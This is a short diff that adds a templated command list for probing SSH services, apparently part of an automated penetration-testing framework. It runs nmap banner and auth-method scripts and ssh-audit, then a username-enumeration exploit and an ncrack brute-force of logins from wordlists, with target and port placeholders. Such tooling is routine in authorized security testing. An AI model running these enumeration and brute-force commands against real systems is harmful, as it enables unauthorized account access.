@@ -1,0 +1,4 @@
+nmap.exe -Pn -p _PORT_ --script=banner,ssh-auth-methods,sshv1 -oA "ssh/_TARGET_._PORT_.script" _TARGET_  > /dev/null 2>&1 & tail --pid=$! -f /dev/null 2>&1
+ssh-audit _TARGET_:_PORT_ > "ssh/_TARGET_._PORT_.sshaudit.txt"
+sshUsernameEnumExploit --port _PORT_ --userList "_APP_PATH_/brute-force/common_usernames.small.txt" --outputFormat list --outputFile "ssh/_TARGET_._PORT_.sshUsernameEnumExploit" _TARGET_ > /dev/null 2>&1
+ncrack  -v -U "_APP_PATH_/brute-force/usernames.ssh.txt" -P "_APP_PATH_/brute-force/passwords.ssh.txt" -p ssh:_PORT_ -oA "ssh/_TARGET_._PORT_.ncrack" _TARGET_
